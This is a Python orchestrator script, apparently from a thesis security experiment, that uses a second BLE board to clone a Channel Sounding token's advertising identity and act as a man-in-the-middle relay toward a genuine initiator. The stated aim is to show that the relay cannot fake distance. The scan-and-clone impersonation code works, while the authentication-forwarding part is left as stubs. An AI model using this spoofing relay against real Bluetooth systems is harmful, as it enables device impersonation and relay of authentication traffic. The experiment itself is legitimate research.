#!/usr/bin/env python3
"""
relay_orch.py -- Relay-attack test orchestrator for a BLE Channel Sounding (CS) ranging system.

PURPOSE (thesis security experiment)
------------------------------------
Drive a *second* BRD2606 running stock NCP-CS firmware (`bt_cs_ncp`) as a logical
man-in-the-middle relay between:

    Genuine Initiator (bt_cs_soc_initiator_2, brd4198a)  <-- ranges -->  Genuine Token
                                                                          (bt_cs_soc_reflector_brd2606
                                                                           / AoA asset-tag firmware)

All relay logic runs HERE on the PC over BGAPI; the relay board firmware is unmodified NCP-CS.

WHAT THIS DEMONSTRATES
----------------------
Channel Sounding binds distance to the *physical* CS procedure of one LE connection.
A logical relay can clone the token's advertising identity and forward application/GATT
traffic, but it CANNOT forward physical distance:

  * The relay advertises as a clone of the token ("CS RFLCT" + copied adv/DIS) so the
    genuine initiator connects to the RELAY believing it is the token.
  * The relay runs a genuine CS *reflector* role on that link (ACP CREATE_REFLECTOR).
    Its on-board RAS server then serves ranging data derived from the REAL CS procedure
    between initiator and relay -- i.e. distance-to-relay-box.
  * Result: the initiator reports the distance to the relay, NOT to the token. Park the
    relay 5 m from the initiator while the token sits 1 m away and the measured distance
    diverges -> the relay is exposed. That divergence is the experimental result.

  * (Optional) conn #2: the relay also connects to the genuine token as a central to
    forward any higher-layer authentication GATT the initiator drives. This proves the
    *auth* channel can be relayed while *ranging* still cannot -- the core CS claim.

WHY NOT A DISTANCE-SHRINKING RELAY?
-----------------------------------
A relay that *reduces* measured distance needs an analog amplify-and-forward repeater or
an SDR at the tone frequencies with sub-ns added delay (+ predictive early-detect to beat
RTT). An EFR32 is a digital store-and-forward radio: its added latency (us) maps to
hundreds of metres of apparent distance, so CS RTT rejects it instantly. Document this in
the "limitations" section; it is out of scope for a 2606.

WIRING / PREREQUISITES
----------------------
  pip install pybgapi
  * Relay board: flash `bt_cs_ncp` (exposes the CS ACP user-message API used below).
  * Token: keep bt_cs_soc_reflector_brd2606 (or combined AoA asset-tag firmware) -- the victim.
  * Initiator: keep bt_cs_soc_initiator_2 -- the verifier.
  * Point API_XAPI at the SDK's sl_bt.xapi (and any *.xapi the NCP build emits).

USAGE
-----
  # Relay NCP over USB serial (stock bt_cs_ncp uses HW RTS/CTS flow control, on by default):
  python relay_orch.py --serial COM6 --baud 115200

  # Relay NCP over WSTK-on-IP (raw VCOM TCP, e.g. 4901):
  python relay_orch.py --ip 192.168.8.220 --port 4901

NOTE: This is a scaffold. The relay captures and clones the token's real advertising data
automatically (scan-and-clone). Remaining `TODO`s need values from your own hardware only
for the optional auth backhaul (GATT handle map). Caveat: in the minimal demo the genuine
token keeps advertising, so the initiator could connect to the real token instead of the
clone -- position the relay closer / stronger, or enable the backhaul (which connects the
token and silences its advertising).
"""

from __future__ import annotations

import argparse
import io
import logging
import struct
import sys
import time
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Optional

try:
    import bgapi  # pybgapi
except ImportError:  # pragma: no cover
    sys.exit("pybgapi not installed. Run: pip install pybgapi")

# -----------------------------------------------------------------------------
# Configuration -- EDIT THESE FOR YOUR RIG
# -----------------------------------------------------------------------------

# Path to the BGAPI definition file(s). sl_bt.xapi ships in the SDK under
# bluetooth_le_host/api/. It already defines the CS user-service messages.
API_XAPI = [
    r"C:/Users/mpmen/.silabs/slt/installs/conan/p/simpl35774a752829c/p/bluetooth_le_host/api/sl_bt.xapi",
]

# The genuine token advertises with this name; the relay clones it to attract the
# genuine initiator. The stock CS reflector advertises as "CS RFLCT" -- but the combined
# AoA asset-tag firmware may advertise a different name, so prefer pinning by address below.
TOKEN_ADV_NAME = "CS RFLCT"

# Pin the genuine token by Bluetooth address. When set, the relay matches the token by
# address ONLY (name is ignored) -- the robust option for the asset-tag firmware.
# VERIFY against the scan discovery log printed at startup (it lists address + name + RSSI
# for every device seen). Your reported value was "449FDAE24523F"; a BLE MAC is 12 hex
# digits, so confirm the exact address from the log and correct this if needed.
TOKEN_BT_ADDRESS: Optional[str] = "44:9f:da:e2:45:23"  # <-- VERIFY from discovery log
TOKEN_BT_ADDRESS_TYPE = 0  # 0 = public, 1 = static random

# CS reflector role parameters the relay presents to the genuine initiator (conn #1).
# cs_reflector_config_t = { int8 max_tx_power_dbm; uint8 cs_sync_antenna; }
REFLECTOR_MAX_TX_POWER_DBM = 10
REFLECTOR_CS_SYNC_ANTENNA = 1

# Set True to also open conn #2 to the genuine token and bridge higher-layer auth GATT.
# Leave False for the minimal "ranging cannot be relayed" demonstration.
ENABLE_AUTH_BACKHAUL = False

LOG_CSV_PATH = "relay_results.csv"

# -----------------------------------------------------------------------------
# CS ACP wire protocol (mirrors cs_acp.h from the SDK)
# -----------------------------------------------------------------------------


class AcpCmd(IntEnum):
    CREATE_INITIATOR = 0
    CREATE_REFLECTOR = 1
    INITIATOR_ACTION = 2
    REFLECTOR_ACTION = 3
    ANTENNA_CONFIGURE = 4
    ENABLE_TRACE = 5
    GET_TARGET_CONFIG = 6


class AcpReflectorAction(IntEnum):
    DELETE_REFLECTOR = 0


class AcpEvt(IntEnum):
    RESULT = 0
    STATUS = 1
    INTERMEDIATE_RESULT = 2
    EXTENDED_RESULT = 3


# cs_result_field_type_t (cs_result.h) -> (label, struct format).
# The result event carries a flat list of [type:u8][value:...] pairs.
CS_RESULT_FIELDS = {
    0x00: ("distance_mainmode_m", "<f"),
    0x01: ("distance_submode_m", "<f"),
    0x02: ("distance_raw_mainmode_m", "<f"),
    0x03: ("distance_raw_submode_m", "<f"),
    0x04: ("likeliness_mainmode", "<f"),
    0x05: ("likeliness_submode", "<f"),
    0x06: ("distance_rssi_m", "<f"),
    0x07: ("velocity_mainmode", "<f"),
    0x08: ("velocity_submode", "<f"),
    0x09: ("bit_error_rate", "<B"),
}


def pack_create_reflector(conn_id: int,
                          max_tx_power_dbm: int = REFLECTOR_MAX_TX_POWER_DBM,
                          cs_sync_antenna: int = REFLECTOR_CS_SYNC_ANTENNA) -> bytes:
    """cs_acp_cmd_t{ cmd_id; create_reflector_cmd_data{ conn_id, cs_reflector_config_t } }.

    Layout (all SL_ATTRIBUTE_PACKED):
        u8  cmd_id            = CS_ACP_CMD_CREATE_REFLECTOR
        u8  connection_id
        i8  max_tx_power_dbm
        u8  cs_sync_antenna
    """
    return struct.pack("<BBbB",
                       AcpCmd.CREATE_REFLECTOR,
                       conn_id & 0xFF,
                       max_tx_power_dbm,
                       cs_sync_antenna & 0xFF)


def pack_delete_reflector(conn_id: int) -> bytes:
    """cs_acp_cmd_t{ cmd_id=REFLECTOR_ACTION, reflector_action_data{ conn_id, action } }."""
    return struct.pack("<BBB",
                       AcpCmd.REFLECTOR_ACTION,
                       conn_id & 0xFF,
                       AcpReflectorAction.DELETE_REFLECTOR)


def pack_get_target_config() -> bytes:
    return struct.pack("<B", AcpCmd.GET_TARGET_CONFIG)


def _parse_adv_name(ad: bytes) -> Optional[str]:
    """Extract the (complete or shortened) local name from an AD payload."""
    i = 0
    while i + 1 < len(ad):
        length = ad[i]
        if length == 0:
            break
        ad_type = ad[i + 1]
        value = ad[i + 2:i + 1 + length]
        if ad_type in (0x08, 0x09):  # shortened / complete local name
            try:
                return value.decode("utf-8", "replace")
            except Exception:
                return None
        i += 1 + length
    return None


def parse_cs_event(payload: bytes) -> dict:
    """Decode a cs_acp_event_t delivered via user_cs_service_message_to_host.

    Layout: u8 connection_id; u8 acp_evt_id; <union by evt id>.
    Only RESULT and STATUS are decoded here (the relay runs a reflector role; the
    initiator-side RESULT events are what you correlate against ground truth).
    """
    if len(payload) < 2:
        return {"raw": payload.hex(), "error": "short"}
    conn_id, evt_id = payload[0], payload[1]
    body = payload[2:]
    out: dict = {"connection_id": conn_id, "evt_id": evt_id}

    if evt_id == AcpEvt.RESULT:
        out["evt"] = "result"
        out.update(_parse_result_tlv(body))
    elif evt_id == AcpEvt.STATUS:
        out["evt"] = "status"
        if len(body) >= 5:
            sc, err = struct.unpack_from("<IB", body, 0)
            out["sc"] = sc
            out["error"] = err
    elif evt_id == AcpEvt.INTERMEDIATE_RESULT:
        out["evt"] = "intermediate"
        if len(body) >= 4:
            out["progress_pct"] = struct.unpack_from("<f", body, 0)[0]
    elif evt_id == AcpEvt.EXTENDED_RESULT:
        out["evt"] = "extended_result_fragment"
        out["raw"] = body.hex()
    return out


def _parse_result_tlv(body: bytes) -> dict:
    """Walk the type-value list emitted by cs_result_create_session_data()."""
    fields: dict = {}
    i = 0
    while i < len(body):
        ftype = body[i]
        i += 1
        spec = CS_RESULT_FIELDS.get(ftype)
        if spec is None:
            # Unknown field type -- cannot know its length; stop to stay safe.
            fields["_unparsed_from_type"] = ftype
            break
        label, fmt = spec
        size = struct.calcsize(fmt)
        if i + size > len(body):
            break
        (val,) = struct.unpack_from(fmt, body, i)
        fields[label] = val
        i += size
    return fields


# -----------------------------------------------------------------------------
# Relay orchestrator
# -----------------------------------------------------------------------------


@dataclass
class RelayState:
    initiator_conn: Optional[int] = None   # conn #1: genuine initiator -> relay (relay = reflector)
    token_conn: Optional[int] = None       # conn #2: relay -> genuine token (relay = central)
    reflector_active: bool = False
    adv_handle: Optional[int] = None
    # Token advertising identity captured live by the scan-and-clone step.
    captured_ad: Optional[bytes] = None
    token_address: Optional[str] = None
    token_address_type: int = 0
    cloned: bool = False
    results: list = field(default_factory=list)


class RelayOrchestrator:
    def __init__(self, connector, apis):
        self.lib = bgapi.BGLib(connector, apis, event_handler=None)
        self.log = logging.getLogger("relay")
        self.state = RelayState()
        self._csv: Optional[io.TextIOWrapper] = None
        self._seen: set = set()

    # -- lifecycle -----------------------------------------------------------

    def open(self):
        self.lib.open()
        self._csv = open(LOG_CSV_PATH, "a", encoding="utf-8")
        if self._csv.tell() == 0:
            self._csv.write("ts,leg,connection,distance_m,likeliness,raw\n")

    def close(self):
        try:
            if self.state.reflector_active and self.state.initiator_conn is not None:
                self._acp(pack_delete_reflector(self.state.initiator_conn))
        finally:
            if self._csv:
                self._csv.close()
            self.lib.close()

    def run(self):
        self.open()
        self.log.info("Resetting relay NCP...")
        # sl_bt_system_reset was replaced by system_reboot; it re-emits system_boot.
        self.lib.bt.system.reboot()
        try:
            # timeout=None blocks per event; max_time=None runs until interrupted.
            for evt in self.lib.gen_events(timeout=None, max_time=None):
                self._dispatch(evt)
        except KeyboardInterrupt:
            self.log.info("Interrupted; tearing down.")
        finally:
            self.close()

    # -- BGAPI helpers -------------------------------------------------------

    def _acp(self, payload: bytes):
        """Send a CS ACP command via the NCP user-CS-service message channel."""
        rsp = self.lib.bt.user.cs_service_message_to_target(payload)
        if getattr(rsp, "result", 0) != 0:
            self.log.warning("ACP cmd 0x%02x -> result 0x%04x", payload[0], rsp.result)
        return rsp

    def _start_clone_advertising(self):
        """Advertise as a clone of the token so the genuine initiator connects here.

        Uses the token's REAL advertising payload captured live by the scan-and-clone
        step (state.captured_ad). Falls back to a name-only AD if nothing was captured
        yet (e.g. token was silent during the scan window).
        """
        if self.state.adv_handle is None:
            self.state.adv_handle = self.lib.bt.advertiser.create_set().handle
        adv = self.state.adv_handle

        ad = self.state.captured_ad
        if ad and len(ad) <= 31:
            self.lib.bt.legacy_advertiser.set_data(adv, 0, ad)
            self.log.info("Clone advertising token's captured AD (%d B) on set %d.",
                          len(ad), adv)
        else:
            if ad and len(ad) > 31:
                self.log.warning("Token AD is %d B (>31): token uses EXTENDED advertising. "
                                 "Legacy clone truncates; use extended_advertiser for a "
                                 "faithful clone. Falling back to name-only AD.", len(ad))
            name = TOKEN_ADV_NAME.encode()
            fallback = bytes([2, 0x01, 0x06, len(name) + 1, 0x09]) + name
            self.lib.bt.legacy_advertiser.set_data(adv, 0, fallback)
            self.log.info("Clone advertising name-only AD '%s' on set %d.",
                          TOKEN_ADV_NAME, adv)

        # 100 ms interval, connectable.
        self.lib.bt.advertiser.set_timing(adv, 160, 160, 0, 0)
        self.lib.bt.legacy_advertiser.start(
            adv, self.lib.bt.legacy_advertiser.CONNECTION_MODE_CONNECTABLE)

    def _start_token_scan(self):
        """Scan for the genuine token to capture its AD (clone) and, optionally, to
        open the auth backhaul (conn #2)."""
        self.lib.bt.scanner.set_parameters(
            self.lib.bt.scanner.SCAN_MODE_SCAN_MODE_PASSIVE, 160, 160)
        self.lib.bt.scanner.start(
            self.lib.bt.scanner.SCAN_PHY_SCAN_PHY_1M,
            self.lib.bt.scanner.DISCOVER_MODE_DISCOVER_GENERIC)
        self.log.info("Scanning for genuine token to clone its advertising data...")

    # -- event dispatch ------------------------------------------------------

    def _dispatch(self, evt):
        # All pybgapi events share the BGEvent Python class; the real identity is
        # evt._str, e.g. 'bt_evt_system_boot'. Map it to a handler method.
        ident = getattr(evt, "_str", "")  # 'bt_evt_<class>_<name>'
        key = ident.replace("bt_evt_", "", 1)
        handler = getattr(self, "_on_" + key, None)
        if handler:
            handler(evt)
        else:
            self.log.debug("unhandled evt %s", ident or evt)

    def _on_system_boot(self, evt):
        self.log.info("Relay NCP boot: BLE stack %d.%d.%d",
                      evt.major, evt.minor, evt.patch)
        # Report the target's CS capabilities (sanity check that ACP is wired).
        self._acp(pack_get_target_config())
        # Capture the token's real AD first, then clone-advertise from the scan result.
        self._start_token_scan()

    def _on_scanner_legacy_advertisement_report(self, evt):
        if self.state.cloned:
            return
        # Log every distinct device so the operator can identify the token's real address.
        self._log_discovery(evt)
        if not self._is_genuine_token(evt):
            return
        # Capture the token's real advertising payload for a faithful clone.
        self.state.captured_ad = bytes(evt.data)
        self.state.token_address = evt.address
        self.state.token_address_type = evt.address_type
        self.state.cloned = True
        self.lib.bt.scanner.stop()
        self.log.info("Captured token %s AD (%d B). Cloning.",
                      evt.address, len(self.state.captured_ad))
        self._start_clone_advertising()
        if ENABLE_AUTH_BACKHAUL and self.state.token_conn is None:
            self.log.info("Opening auth backhaul to genuine token %s.", evt.address)
            self.lib.bt.connection.open(
                evt.address, evt.address_type, self.lib.bt.gap.PHY_PHY_1M)

    # Some SDKs deliver extended reports instead; alias to the same handler.
    _on_scanner_extended_advertisement_report = _on_scanner_legacy_advertisement_report

    def _log_discovery(self, evt):
        """Print each newly-seen device (address, name, RSSI) to help pin the token."""
        addr = evt.address
        if addr in self._seen:
            return
        self._seen.add(addr)
        name = _parse_adv_name(bytes(evt.data)) or "<no name>"
        rssi = getattr(evt, "rssi", 0)
        self.log.info("  discovered %s (type %d) rssi=%-4d name='%s'",
                      addr, evt.address_type, rssi, name)

    def _is_genuine_token(self, evt) -> bool:
        if TOKEN_BT_ADDRESS:
            # Address pinned: match on address only (name ignored).
            return evt.address.lower() == TOKEN_BT_ADDRESS.lower()
        # Otherwise match by complete local name in the AD payload.
        return TOKEN_ADV_NAME.encode() in bytes(evt.data)

    def _on_connection_opened(self, evt):
        # role: 0 = peripheral (genuine initiator connected to our clone),
        #       1 = central   (we connected to the genuine token).
        if evt.role == 0:
            self.state.initiator_conn = evt.connection
            self.log.info("Genuine initiator connected (conn %d). Creating CS reflector role.",
                          evt.connection)
            rsp = self._acp(pack_create_reflector(evt.connection))
            self.state.reflector_active = getattr(rsp, "result", 1) == 0
        else:
            self.state.token_conn = evt.connection
            self.log.info("Backhaul to genuine token open (conn %d).", evt.connection)
            # TODO(auth-backhaul): discover token GATT services here to build the
            # handle map used by _bridge_gatt_* below.

    def _on_connection_closed(self, evt):
        if evt.connection == self.state.initiator_conn:
            self.log.info("Initiator leg closed; deleting reflector role.")
            if self.state.reflector_active:
                self._acp(pack_delete_reflector(evt.connection))
            self.state.initiator_conn = None
            self.state.reflector_active = False
            # Re-arm to catch the next ranging attempt.
            self._start_clone_advertising()
        elif evt.connection == self.state.token_conn:
            self.log.info("Backhaul leg closed.")
            self.state.token_conn = None
            if ENABLE_AUTH_BACKHAUL and self.state.token_address:
                # Reconnect straight to the known token address (no re-scan needed).
                self.lib.bt.connection.open(
                    self.state.token_address,
                    self.state.token_address_type,
                    self.lib.bt.gap.PHY_PHY_1M)

    def _on_user_cs_service_message_to_host(self, evt):
        """CS ACP events from the relay's reflector/initiator role."""
        decoded = parse_cs_event(bytes(evt.message))
        if decoded.get("evt") == "result":
            dist = decoded.get("distance_mainmode_m")
            like = decoded.get("likeliness_mainmode")
            self.log.info("CS RESULT conn %s: distance=%.3f m likeliness=%s",
                          decoded["connection_id"],
                          dist if dist is not None else float("nan"),
                          f"{like:.2f}" if like is not None else "n/a")
            if self._csv:
                self._csv.write("%.3f,%s,%s,%s,%s,%s\n" % (
                    time.time(),
                    "initiator_vs_relay",
                    decoded["connection_id"],
                    dist if dist is not None else "",
                    like if like is not None else "",
                    "",
                ))
                self._csv.flush()
            self.state.results.append(decoded)
        elif decoded.get("evt") == "status":
            self.log.info("CS STATUS conn %s: sc=0x%08x err=0x%02x",
                          decoded["connection_id"],
                          decoded.get("sc", 0), decoded.get("error", 0))

    # -- optional GATT auth bridge (conn #1 <-> conn #2) ---------------------
    # The ranging itself needs NO GATT proxy: the relay's local RAS server answers
    # from the real CS procedure on conn #1. These hooks exist only to forward any
    # higher-layer authentication characteristics the initiator may drive.

    def _on_gatt_server_attribute_value(self, evt):
        """Initiator wrote a characteristic on the relay; forward to the token."""
        if not ENABLE_AUTH_BACKHAUL or self.state.token_conn is None:
            return
        # TODO(auth-backhaul): translate evt.attribute -> token characteristic handle
        # via the handle map built at connection_opened, then:
        #   self.lib.bt.gatt.write_characteristic_value(self.state.token_conn, token_handle, evt.value)
        self.log.debug("gatt_server write attr=%d len=%d (forward stub)",
                       evt.attribute, len(evt.value))

    def _on_gatt_characteristic_value(self, evt):
        """Token notified/indicated a value; relay it back to the initiator."""
        if not ENABLE_AUTH_BACKHAUL or self.state.initiator_conn is None:
            return
        # TODO(auth-backhaul): translate evt.characteristic -> relay attribute handle, then:
        #   self.lib.bt.gatt_server.send_notification(self.state.initiator_conn, relay_handle, evt.value)
        self.log.debug("gatt notify char=%d len=%d (forward stub)",
                       evt.characteristic, len(evt.value))


# -----------------------------------------------------------------------------
# Entry point
# -----------------------------------------------------------------------------


def build_connector(args):
    if args.serial:
        # The stock bt_cs_ncp firmware enables SL_UARTDRV_USART_VCOM_FLOW_CONTROL_TYPE =
        # uartdrvFlowControlHw, so the host MUST assert RTS/CTS or the NCP never transmits
        # (CTS stays deasserted -> "No response"). Default on; --no-flow disables it.
        return bgapi.SerialConnector(args.serial, baudrate=args.baud,
                                     rtscts=not args.no_flow)
    if args.ip:
        return bgapi.SocketConnector((args.ip, args.port))
    raise SystemExit("Specify --serial COMx or --ip <addr> [--port 4901].")


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--serial", help="Relay NCP serial port, e.g. COM7")
    ap.add_argument("--baud", type=int, default=115200)
    ap.add_argument("--no-flow", action="store_true",
                    help="Disable HW RTS/CTS flow control (stock NCP needs it ON).")
    ap.add_argument("--ip", help="Relay NCP WSTK IP (raw VCOM TCP)")
    ap.add_argument("--port", type=int, default=4901)
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args(argv)

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s %(levelname)-7s %(name)s: %(message)s")

    connector = build_connector(args)
    orch = RelayOrchestrator(connector, API_XAPI)
    orch.run()


if __name__ == "__main__":
    main()
